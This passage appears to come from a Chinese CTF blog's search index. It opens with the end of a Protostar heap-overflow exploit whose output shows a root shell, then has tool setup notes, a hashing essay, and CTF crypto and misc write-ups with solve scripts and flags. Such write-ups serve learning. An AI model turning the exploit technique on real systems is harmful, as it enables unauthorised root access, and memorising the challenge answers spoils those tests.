"\x90"*(128-len(shellcode)-4-4-1-4-4-4-4) + shellcode + "/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x98\xe0\x04\x08" )r.interactive() 123456root@kali:~/Documents/Protostar# python final2.py [+] Opening connection to 192.168.116.137 on port 2993: Done[*] Switching to interactive modeProcess OK$ iduid=0(root) gid=0(root) groups=0(root)]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>WARGAME</tag>
        <tag>PWN</tag>
        <tag>stackoverflow</tag>
        <tag>formatstring</tag>
        <tag>heapoverflow</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在pip连不上网的时候安装pwntools]]></title>
    <url>%2F%E5%9C%A8pip%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85pwntools%2F</url>
    <content type="text"><![CDATA[本文描述了这样一种特殊情况下安装pwntools的解决方案：有方法联网，但是pip连不上网。 解决方法很简单，就是将pwntools和其依赖包下载下来，然后手动安装。选择对应版本，有whl直接下载whl，没有就下载源代码用命令python setup install安装，安装的时候可能会遇到有预先依赖，那就先安装依赖的包就行。 下图是我在2018年7月22日下载的一套，有需要的度盘链接：https://pan.baidu.com/s/1efC82WX_TdAMoS7aVBFi1w 密码：lnv8 安装效果如下图]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF用环境搭建]]></title>
    <url>%2FCTF%E7%94%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[目前工具集合环境 86架构及基本库 wine32 安装式这里的话就是那种安装以后直接用的，也有的是插件 pwndbg r2 Audacity 非安装式这里的是不用/不能安装的库，比如脚本等 统一放置在/opt/目录下，可能根据类别再分 rsatool cloacked-pixel volatility routerpassview Stegsolve CTFcrackTools Python库 pwntools gmpy2 unicorn zio angr request 正文环境86架构及其个别基本库12345dpkg --add-architecture i386 apt-get updateapt-get -f dist-upgrade apt-get updateapt-get install lib32c-dev lib32stdc++6 wine321apt-get install wine32 安装式pwndbg1234apt-get install python3.7-devgit clone https://github.com/pwndbg/pwndbg /opt/pwndbgcd /opt/pwndbg./setup.sh 如果对pip无法用的时候怎么安装感兴趣，可以戳这里 r2123git clone https://github.com/radare/radare2.git /opt/r2cd /opt/r2/sys/install.sh Audacity1apt-get install audacity 非安装式 工具 指令 备注 rsatool git clone https://github.com/ius/rsatool.git /opt/Crypto/rsatool Openssl RSA密钥生成 cloacked-pixel git clone https://github.com/livz/cloacked-pixel /opt/Steganography/cloacked-pixel 图像隐写 pattern 无 volatility git clone https://github.com/volatilityfoundation/volatility.git /opt/Forensics/volatility 内存取证 Python库默认在pip能用的情况下，默认为python2.7，其他版本会备注 工具 指令 备注 pwntools pip install pwntools gmpy2 apt-get install python-gmpy2 zio pip install termcolor zio angr pip install angr unicorn pip install unicorn pwntools自带，但是不妨碍你只安装它 request pip install request]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于散列函数的一点思考]]></title>
    <url>%2F%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[今天在ACM群灌水的时候因为一个题目引发了一些思考，题目是比赛链接的A题 其实题目很明显，3e4的字符串总量，1e3的字符串长度上限，样例就显示了有字母、数字、符号，就10M内存，用字典树妥妥炸了。 所以就哈希呗。 幸运的是STL里就有自带的hash函数，于是就水过去了。 1234567891011121314151617#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; ios::sync_with_stdio(0); set&lt;long long&gt; m; hash&lt;string&gt; h; int n; string temp; cin&gt;&gt;n; while(n--)&#123; cin&gt;&gt;temp; m.insert(h(temp)); &#125; cout&lt;&lt;m.size()&lt;&lt;endl; return 0;&#125; 因为其实3e4这个字符串数量还是比较大的，在群里聊起了碰撞的问题，然后发现还是有丶东西，索性写一篇博文分析一下。 散列函数简介散列函数，也称哈希函数，是一种将任意大小数据映射到固定长度数字的单向函数。 散列函数常见于密码学的目的，随着密码学渗透到计算机的方方面面，因为其一些有用的特性也被用于ACM竞赛中。 通常来说，好的散列函数拥有以下几个特性： 确定性。固定输入对应的散列值是固定的。 分布均一。优秀的散列函数会使得所有值可能出现的概率尽量一致，这也导出了后面引出的一些特性。 值域固定。比如std::hash的值域为size_t的可表示范围，SHA-1的值域为$[0,2^{160}-1]$。 于是，用于密码学的散列函数经常有以下的特性： 单向性。这里有两个含义，一方面来说既然任意大小的数据都被映射到固定范围的一些值上，那么必然是一个多对一的关系，这就是第一个单向的原因；第二个原因则是函数本身的算法经常会保证无法通过散列值计算原始数据可能的集合。 雪崩效应。一个比特的改变，可能就会引起值的大幅度变化（按CryptoExchane的说法，是一半以上的比特）。这样就很难通过碰撞发起攻击了。 抗碰撞性。这里具体又分为两种，一种为抗弱碰撞性，另一种为抗强碰撞性，分别对应第二原像攻击和碰撞攻击。 抗弱碰撞性。指对于某散列函数$H()$与任意给定的$x$，找到$y≠x$且$H(x)=H(y)$在计算上不可行。 抗强碰撞性。值对于某散列函数$H()$而言，找到$H(x)=H(y)$且$x≠y$这样的数对在计算上不可行。 公开性。为了鉴别需求，常见的散列函数算法公开，这样任何能够编程的人都可以自己编程验证散列值。 ACM中的散列函数这里毕竟一个是我也退役了，没碰ACM有些时日，另一个我打ACM时也没有学得很深，所以这里的举例只能拿我们讲课的课件来粗糙地分析一下了，如果有误欢迎指出。 顺便ACM这比赛打过的同学就知道，不可能真写一个类似MD5这样的散列函数，ACM中的散列函数我通常用一句话概括：“又不是不能用。” 对于ACM当然是够用的，用其他地方就，再商量吧~ 直接模余法首先对于整数来说，最简单的方式就是模余法了，这也是很多题目处理大数的方式。模余法要尽量模上一个素数，这样会使得冲突的可能性降低。 但是选手在写题的时候通常不会直接模余，因为即便这样冲突降低，但是依然不小，而且会后续规避这样冲突的处理操作并不是很舒服。 转换(模余)法这里请看这个例题(HDOJ-1496 Equations) 题意简单，就类似“百钱买百鸡”问题。 但是如果直接暴力地四重循环，那可就很嗨了……虽说一般一秒做$10^8$简单计算的确可以，但是这题的数据的确就是在超时的边缘。 正确的做法就是预处理两个变量所有可能对应值的相反数，然后进行查找。 但是如果直接搞，那就需要开$2×10^7$大小的数组，不仅在MLE的边缘，而且还有初始化TLE的风险。 所以这里就可以用散列了。具体讨论见这里 同样的，对于一个纯字母的字符串来说，也可以进行这样的转换。就是将一个字符串视为二十六进制的数字，然后求这个数字的十进制值，因为可能会溢出，就模上一个素数如$1000000007$这样的。 字符串HASH——ELFHASH这里直接放它的代码吧，十分简短。 12345678910111213141516171819202122// ELF Hash Function unsigned int ELFHash(char *str) &#123; unsigned int hash = 0; unsigned int x = 0; while (*str) &#123; hash = (hash &lt;&lt; 4) + (*str++);//hash左移4位，把当前字符ASCII存入hash低四位。 if ((x = hash &amp; 0xF0000000L) != 0) &#123; //如果最高的四位不为0，则说明字符多余7个，现在正在存第7个字符，如果不处理，再加下一个字符时，第一个字符会被移出，因此要有如下处理。 //该处理，如果最高位为0，就会仅仅影响5-8位，否则会影响5-31位，因为C语言使用的算数移位 //因为1-4位刚刚存储了新加入到字符，所以不能&gt;&gt;28 hash ^= (x &gt;&gt; 24); //上面这行代码并不会对X有影响，本身X和hash的高4位相同，下面这行代码&amp;~即对28-31(高4位)位清零。 hash &amp;= ~x; &#125; &#125; //返回一个符号位为0的数，即丢弃最高位，以免函数外产生影响。(我们可以考虑，如果只有字符，符号位不可能为负) return (hash &amp; 0x7FFFFFFF); &#125; 这个函数写起来十分简单。我把注释也复制过来了，就不多解释了。 散列值碰撞了，怎么办？扯了那么多前篇，终于到这篇博文真实目的了，不过估计会很短…… 既然是散列函数，就要面对这个问题，一旦发生碰撞，很多问题就出来了，这里就简单分析一下针对散列函数的几个攻击吧。同时也会分析一下在ACM中散列函数的一点使用方法。 穷举攻击对于一个理想的散列函数来说，既然满足了上面的几个特性，穷举攻击需要的次数应该就是$\frac{值域}{2}$。 给你一个懂事的微笑。 生日攻击现在我们就尝试攻击散列函数的强抗碰撞性。这里以std::hash为例。 基于散列函数的几个特性来说，我们得到值域内任意值的可能性都为$\frac1{2^{32}}$。那么，在计算不同的任意$n$个字符串候，这些散列值都不冲突的可能性就是$\frac{2^{32}-1}{2^{32}}×\frac{2^{32}-2}{2^{32}}×...×\frac{2^{32}-n+1}{2^{32}}$。 对于题目给的数据，使用下面Python代码可以计算得不发生冲突的概率为$0.9005311337474664$即发生错误的可能性为$0.0994688662525336$。 12345678# a.pya = 1 &lt;&lt; 32s = 1for i in range(0, 30000): s *= (a-i)/aprint(s)#python a.py#0.9005311337474664 可见这个数字对于脸白的人来说是够了的。 教练我脸黑——多重散列函数那么我们就要考虑找路子了，这里又有两条分支了： 既然一个散列函数不行，那我就再来一个。之前是把字母字符串视为二十六进制数，那我就加个ELFHASH。这样做的好处是发生冲突的可能性稳定下降（变为两者发生冲突的乘积），坏处是编码难度上升。 加盐，加不同的盐值。但是这里要求散列函数是对块进行操作的。 加盐，可以简单理解为在字符串前/后面加上一个字符串，这样就可以使散列值发生变化。 对散列函数的要求是显而易见的，因为不论是二十六进制还是ELFHASH，只要之前字符串的散列值是同一个，那么在加盐后结果也不会发生改变。（块的大小对这里也会有影响，这里留给读者自行考虑） 对于GCC的std::hash来说，它用的是$MurmurHash Unaligned 2$，是一个分块大小为4的非密码学散列函数。 考虑理想状况，我们将多个盐值对应的不同散列值作为比对的标准，我们就能在一定程度上解决冲突，这里又能分出两条线。 将不同散列值放在不同容器里考虑这样的比对算法 12345678910111213141516//There is a bunch of set containers named s[0]/s[1]/etcstring str;cin &gt;&gt;str;temp = hash(str)if(!s[0].count(temp))&#123; s[0].insert(temp) count++&#125;else&#123; temp = hash(str+"salt1") if(!s[1].count(temp))&#123; s[1].insert(temp) count++ &#125;else&#123; //etc &#125;&#125; 那么可能会发生这样的问题，就是字符串s在第一次比对时和a串冲突，在第二次比对时又和b串冲突。 易知对于固定数量$n$的生日攻击来说，不发生冲突的概率$p$是一定的，假设多重散列函数就像我们所想的一样工作，那么该实验可以认为是一个成功率为$1-p$的伯努利实验。 在$m$重散列函数的情况下，均发生冲突的可能性是$P_0(m)=C_m^0(1-p)^m$，取这次题目的数据来说，两重散列函数发生冲突的概率为$0.009894055353564416$。 将各散列值包装成一个整体也就是说算法改为 1234567891011121314struct hashv&#123; size_t v[2];&#125;;set&lt;hashv&gt; s;string str;cin&gt;&gt;str;hashv temptemp.v[0] = hash(str)temp.v[1] = hash(str+"salt")if(!s.count(temp))&#123; s.insert(temp); count++;&#125; 理想状态下，此时发生单次冲突的概率为两次散列均冲突的概率，即两者的乘积，也就是$2^{64}-2^{33}+1$ 利用以下python代码计算得在题设情况下，不发生冲突的可能性为$0.9999999999999999999971601954045129840219384586382661991347799758614026869784477630643202473665079505271849114917935938025327598810920608449$ ，太强辣！ 1234567891011from decimal import *a = 1 &lt;&lt; 64 - 1&lt;&lt;33 +1a = Decimal(str(a))print(a)s = Decimal("1")getcontext().prec = 2000for i in range(0, 30000): if not i% 1000: print(i) s *= (a-Decimal(str(i)))/aprint(s) 可以发现，这样做以后是几何倍数降低发生碰撞的可能性了。 那么只有一个考虑了，就是这个结构体打算怎么写，不过这个问题就不是我操心的啦~ 后记思考使我快乐，即便这篇文章很水嘻嘻嘻 睡觉去啦~]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>ACM</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFCTF2018-Crypto_OfficialWriteUp]]></title>
    <url>%2FAFCTF2018-Crypto-OfficialWriteUp%2F</url>
    <content type="text"><![CDATA[最后四个题没人做出来 题目丢到了github，欢迎来玩~ https://github.com/CSUwangj/AFCTF2018-Crypto 简单题Morse解题思路摩尔斯电码转字符，观察会发现是十六进制数，转ASCII码得flag flagafctf{1s&#39;t_s0_345y} BASE解题思路现在放出加密代码 123456789101112131415161718192021import base64import randomimport osimport syswith open('flag.txt', 'r') as file: flag = bytes(file.read(),'ascii') file.close()for i in range(0, 30): print(i) a = random.randint(0, 2) if a == 2: flag = base64.b64encode(flag) elif a == 1: flag = base64.b32encode(flag) else: flag = base64.b16encode(flag)with open('flag_encode.txt', 'w') as file: file.write(str(flag)[2:-1]) file.close() 这个问题的关键在于，经过30重加密的文件不可能会小，直接用文本编辑器打开的都完蛋啦。正确姿势是使用十六进制编辑器或者word打开，或者用程序读入一部分后查看内容。 此外根据题目可以大抵知道这是Base编码。 解密代码如下，可以在出题人博客找到主要部分 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: utf-8 -*-# Python3# Solution.pyfrom base64 import *s = ""with open('flag_encode.txt', 'r') as file: s = bytes(file.read(),'ascii') file.close()lis1 = [s]lis2 = []lis3 = []lis4 = []while(1): for a in lis1: ok = 0 try: lis2.append(b64decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b32decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b16decode(a).decode('ascii')) ok = 1 except: pass if not ok: lis3.append(a) if not len(lis2): break lis1=lis2.copy() lis2.clear()for a in range(0,len(lis3)): ok = 1 for b in lis3[a]: if ord(b)&gt;126 or ord(b)&lt;32: ok = 0 break if ok: lis4.append(lis3[a])print(lis4) flagafctf{U_5h0u1d_Us3_T00l5} MagicNum解题思路这个题可能有点脑洞的成分了，结果导致做出来的人很少。其实提示已经很明显了。 加密代码如下： 12345678910#include &lt;stdio.h&gt;char flag[]="afctf&#123;sec_is_everywhere&#125;";int main()&#123; for(int i=0;i&lt;6;++i)&#123; printf("%20f\n",*(float*)(flag+i*4)); &#125; return 0;&#125; flagafctf{sec_is_everywhere} Single解题思路这是古典密码学中经典的加密方式，单表替换。将a-z映射到a-z排列。 虽然密钥空间达到了 $26!$ 但是可以被频率分析很轻松地解决。 此外为了降低难度，让新人也能靠自己体验一把解密的感觉，将flag以原样放了进去，并且放出了加密代码，即便不了解频率分析也可以手动推算出来。 工具的话用https://quipqiup.com/，可以秒解 flagafctf{Oh_U_found_it_nice_tRy} 非预期解C++标准库里的random_shuffle十分腊鸡……以至于我只放出加密代码的情况下，在另一台机器另一个编译器上……运行得到的结果是一样的……导致直接用加密代码改改就出flag的愚蠢情况…… 出题人表示背锅，并下次手写随机数生成来解决。 Vigenère解题思路多表替换，密钥是csuwangjiang 因为我的昵称和大学都是可见信息，所以又算脑洞了？ 用工具可以秒解，随便放几个吧。 一个维吉尼亚： Vigenère and Gronsfeld Cipher 另一个维吉尼亚：https://atomcated.github.io/Vigenere/ 另一个维吉尼亚：http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx 另一个维吉尼亚：https://f00l.de/hacking/vigenere.php 具体原理就还是频率分析、常见词的替换，比如中间那句可以推测是flag is afctf{....} flagafctf{Whooooooo_U_Gotcha!} 你能看出这是什么加密么？解题思路裸RSA 12345678910111213141516171819!/usr/bin/pythonimport libnump=int('0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f',16)q=int('0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061',16)e=int('0x10001', 16)c=int('0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6',16)n=p*qphi=(p-1)*(q-1)d = libnum.modular.invmod(e, phi)print libnum.n2s(pow(c, d, n)) flagafctf{R54_|5_$0_$imp13} 可怜的RSA解题思路 用OpenSSL查看公钥，尝试将其分解成私钥 1openssl rsa -noout -text -inform PEM -in public.key -pubin 将十六进制转为十进制 1python -c &quot;print int(&apos;25b18bf5f389097d17237866bb51cff8de922453749ebc403b0995c97c0e386d46c161cadff77c69860dae4791c214cf8487aaaa9f26e920a977834906038aefb5c30827dfcf3fc9e9769544f94e07cdfe0872039a3a6262116678b261fb2d6b9d32539e92a153b3675629bab3942e7d35e30f7eef5abf1c50d797d0cc88e1bdccfd1a12ea6f7ef75c3727dbdf2e780f3428ae8f7a4fb7a89f184a365032b153f8425e845750eb2b7abc02dc15ce0207507aa950863bb8480a78028dd62979944d6c633fafa103e4db28ce87f5a0c6ed4a2f2664427f565c7781ab6191456d971c7ffa395272374cec0155e5f91189db742e4c28b03a0fa11cffb03173d2a4cce6ae53&apos;, 16)&quot; 用网站对其分解（http://www.factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443） 得到p、q 然后用rsatool生成私钥，发现flag.enc还经过base64加密，所以最后 123456789101112def decrypt_RSA(privkey, message): from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from base64 import b64decode key = open(privkey, "r").read() rsakey = RSA.importKey(key) rsakey = PKCS1_OAEP.new(rsakey) decrypted = rsakey.decrypt(b64decode(message)) return decrypted flag = "GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA=="print decrypt_RSA('priv.key', flag) flagafctf{R54_|5_$0_B0rin9} One Secret, Two encryption解题思路素数复用，求gcd即可得到一个素数，随便求一对，然后解密得到flag flagflag is afctf{You_Know_0p3u55I} 中等题Tiny LFSR解题思路LFSR的下一位只由当前决定，通过一对明文密文异或获得初始密钥，然后进行解密即可 flagafctf{read_is_hard_but_worthy} MyOwnCBC解题思路读了代码应该知道，其实并不是CBC而是愚蠢的自创加密模式，使用上一步的密文作为新一步的密钥。 所以直接读密文然后解密就行，flag也放在了末尾。 flagafctf{Don&#39;t_be_fooled_by_yourself} 中难题你听过一次一密么？解题思路Many-Time-Pad了解一下？ 按这个名词去谷歌能搜到很多分析 解密代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1='25030206463d3d393131555f7f1d061d4052111a19544e2e5d'c2='0f020606150f203f307f5c0a7f24070747130e16545000035d'c3='1203075429152a7020365c167f390f1013170b1006481e1314'c4='0f4610170e1e2235787f7853372c0f065752111b15454e0e09'c5='081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'c6='0909075412132e247436425332281a1c561f04071d520f0b11'c7='4116111b101e2170203011113a69001b475206011552050219'c8='041006064612297020375453342c17545a01451811411a470e'c9='021311114a5b0335207f7c167f22001b44520c15544801125d'c10='06140611460c26243c7f5c167f3d015446010053005907145d'c11='0f05110d160f263f3a7f4210372c03111313090415481d49'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack#target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): # To store the final key final_key = [None]*150 # To store the positions we know are broken known_key_positions = set() # For each ciphertext for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*150) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index) # Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string) final_key_hex = ''.join([val if val is not None else '00' for val in final_key]) # Xor the currently known key with the target cipher output = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex')) print "Fix this sentence:" print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+"\n" # WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet # fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a" # if is too hard, change the target_cipher to another one and try again # and we have our key to fix the entire text! #sys.exit(0) #comment and continue if u got a good key target_plaintext = "cure, Let Me know if you a" print "Fixed:" print target_plaintext+"\n" key = strxor(target_cipher.decode('hex'),target_plaintext) print "Decrypted msg:" for cipher in ciphers: print strxor(cipher.decode('hex'),key) print "\nPrivate key recovered: "+key+"\n" for i in ciphers: target_fix(i) flagafctf{OPT_1s_Int3rest1ng} 花开藏宝地解题思路题目里的藏宝图 + 题面里提到只要集3份就能解密-&gt;门限方案 花开-&gt;bloom门限方案 也是一次尝试吧，尝试除了加密与编码外的考点 secret1 生日字典/脑洞 19260817 secret2 小写爆破 alice secret3 大写爆破 AVADA secret4 伪加密 secret5 NTFS隐写 任意取得三份后用bloom门限方案解，素数为题面的数字 代码（取1/2/3）： 1234567891011121314151617181920a1 =163305039963008322700958678938420655039108584848594236473036556130206292229761961459635355105529119955950769119000647821166302409987726181456624233820238004130596582552143052085826562771938653314722288583956794740182869336927141053110739981290237894112152720822014240230972011848683576402535994825309029822761855623903611335752059666683377536920052428648302389426609672118522003510398578217d1 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413a2 =151758100093328024755534362157152644916689556800407091638077262152051356374687426002691308331360911658681675621180784078464300557713597658668737755275578303683512763651424490696663046659762209459401095803407234074793144034799798937463085989364658809489473016814564284374253047111285307568938011571482613761721746338619879940928380741377367381517427341679641871126076991209176935339058909863d2 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553a3 = 346077592068259399350080379767941982003794373736058097723728104020814800897686828693026215723695173898771936691822530717642440410239211631306801809213192374695040232378965389612021366734818648007275332322621064659199680848745242700755440206949465953441277866419617961232234201083716216031999849609543380477085554544227121956015035672626500140341901966363694497881768843758979050832435224875d3 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351dd = d1*d2*d3t1 = pow(dd//d1,d1-2,d1)assert(t1*d2*d3%d1 == 1)t2 = pow(dd//d2,d2-2,d2)assert(t2*d1*d3%d2 == 1)t3 = pow(dd//d3,d3-2,d3)assert(t3*d2*d1%d3 == 1)s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2p = 80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857s %= ddprint(s)s %= pprint(s) 最后结果转HEX转ASCII即可 题目生成代码有需要的邮件我叭 flagafctf{1sn&#39;t_s0_int3Resting} 非预期解后来发现自己又犯蠢了。。。 因为选的素数……是用nextprime()选的，所以相差……不大…… 你可以直接把那个素数转成字符串……和明文只有……最后一个字符不一样…… ZZ点数 + 10 难题一道有趣的题目解题思路这道题来自dctf2015 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#求出加密的比特位def decrypt(cipherText): guessed_bits = ['?'] * len(cipherText) length = len(cipherText) i = 0 orded_cipher = [ord(c) &amp; 1 for c in cipherText] decrypt_r(orded_cipher, guessed_bits, i, length, 10)def try_guess(orded_cipher, guessedbits, i, length, guess, space): guessedbits = list(guessedbits) guessedbits[i] = guess if i + space &lt; length - 1: nextndx = i + space else: nextndx = space nextbit = orded_cipher[i] ^ guess if guess == 0: newspace = space + 1 else: newspace = space - 1 if guessedbits[nextndx] == '?' or guessedbits[nextndx] == nextbit: guessedbits[nextndx] = nextbit decrypt_r(orded_cipher, guessedbits, i + 1, length, newspace)def decrypt_r(orded_cipher, guessedbits, i, length, space): if i &gt;= length: print 'ok:', ''.join(str(c) for c in guessedbits) return if guessedbits[i] == '?': try_guess(orded_cipher, guessedbits, i, length, 0, space) try_guess(orded_cipher, guessedbits, i, length, 1, space) elif guessedbits[i] == 0: try_guess(orded_cipher, guessedbits, i, length, 0, space) elif guessedbits[i] == 1: try_guess(orded_cipher, guessedbits, i, length, 1, space) #print ''.join(str(c) for c in guessedbits)s='15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206'#print len(s)s=s.decode('hex')#print len(s)decrypt(s)#求出明文sln='1010011010010101111111101001'ciph=sprint slnimport stringslv = [None] * len(sln)def filling_pass(slv): while True: any = False space = 10 for i in range(len(sln)): if i + space &lt; len(sln) - 1: nx = i + space else: nx = space if sln[i] == '0': space += 1 else: space -= 1 if slv[i] is not None: sn = ord(slv[i]) ^ ord(ciph[i]) if slv[nx] is None: slv[nx] = chr(sn) if (sn &gt;= 32 and sn &lt; 127) or sn == 10 or sn == 13: any = True else: return False else: if slv[nx] != chr(sn): return False if not any: return Truedef tryit(slvo, start): while slvo[start] is not None: start += 1 if start &gt;= len(slvo): print ''.join(' ' if c is None else '.' if ord(c) &lt; 32 else c for c in slvo) return continue for c in string.printable: slv = list(slvo) slv[start] = c possible = filling_pass(slv) if possible: tryit(slv, start)print tryit(slv, 0) flagafctf{cryptanalysis_is_hard} Fast LFSR解题思路使用LFSR生成流密钥，具体名称是Geffe Generator 攻击方式是快速相关攻击（Fast Correlation Attack） 原题出自强网杯StreamGame3，出题的时候还搜不到可用的WP 具体请查看论文以及网上WP如这篇 flagafctf{01abcd056789123456}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-WP合集]]></title>
    <url>%2FJarvisOJ-WP%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[因为预感进度表会很长，所以不放了 不资瓷跳转的进度表 Basic base64 关于USS Lab. veryeasy 段子 手贱 美丽的实验室logo 神秘的文件 公倍数 Easy Crackme Secret 爱吃培根的出题人 Easy RSA ROPGadget 取证 熟悉的声音 Baby&#39;s Crack Help!! Shellcode A Piece Of Cake -.-字符串 德军的密码 握手包 Crypto Medium RSA BrokenPic hard RSA [Ｘ] Basic[Ｘ] base64注意到没有小写字母和大点的数字，猜测是base32，解完以后是一个十六进制字符串，转ASCII解得 flagPCTF{Just_t3st_h4v3_f4n} [Ｘ] 关于USS Lab.搜索得到答案，注意题目里说的是USS Lab。 顺便其实点开about就能看到全称（233 flagPCTF{ubiquitous_system_security} [Ｘ] veryeasy打开文件我就知道要用strings命令，但是我就不，我就翻 flagPCTF{strings_i5_3asy_isnt_i7} [Ｘ] 段子将锟斤拷存ANSI编码，然后HEX编辑器打开就好 flagPCTF{EFBFBDEFBFBD} [Ｘ] 手贱直接解MD5，然后发现说不是标准MD5值，发现长度为33 再看看具体的，发现里面有个$L$的小写，删了解MD5得flag flagPCTF{hack} [Ｘ] 美丽的实验室logobinwalk没有额外东西 但是可以发现不是裸的jpg，strings可以看到Adobe公司工具编辑的痕迹，回去继续 不对，用Stegsolver的Frame Browser看到了flag flagPCTF{You_are_R3ally_Car3ful} [Ｘ] 